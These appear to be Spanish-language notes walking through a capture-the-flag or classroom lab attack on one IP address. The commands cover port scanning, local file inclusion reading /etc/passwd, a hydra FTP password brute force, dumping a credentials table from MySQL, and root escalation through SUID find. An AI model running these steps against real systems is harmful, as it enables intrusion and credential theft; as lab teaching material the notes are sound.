nmap -sV -Pn -T4 --top-ports 100 161.35.98.216

http://161.35.98.216/
LFI:
--- FASE 1: LFI ---

1. Confirmar vulnerabilidad (Leer usuarios del sistema):
   http://161.35.98.216/?page=/etc/passwd

2. Buscar rutas ocultas en el servidor robots.txt:
   http://161.35.98.216/robots.txt

gobuster dir -u http://161.35.98.216/secret_vault/ -w /usr/share/wordlists/dirb/common.txt -x txt

3. Leer archivo restringido (Bóveda de credenciales):
  http://161.35.98.216/?page=/var/www/html/secret_vault/secret.txt


hydra:
nano pass_academia.txt

admin123
password
ucn2024
ucn2025
academia2026
root_ucn

hydra -l admin_ucn -P pass_academia.txt ftp://161.35.98.216

ssh:
ssh admin_ucn@161.35.98.216

cat /root/root.txt

# --- FASE 4.5: Auditoría de Base de Datos ---
# Una vez dentro por SSH, revisamos si hay datos sensibles almacenados

# 1. Listar bases de datos disponibles
mysql -u admin_ucn -p -e "SHOW DATABASES;"

# 2. Extraer credenciales ocultas
mysql -u admin_ucn -p -e "USE ucn_assets; SELECT * FROM credenciales;"

Escalada de privilegios:
# 1. Buscar binarios con permiso SUID (Para que vean por qué elegimos 'find')
find / -perm -4000 2>/dev/null

# 2. Comando para saltar a ROOT
/usr/bin/find . -exec /bin/sh -p \; -quit

# 3. Confirmar identidad y leer el trofeo
whoami
cat /root/root.txt

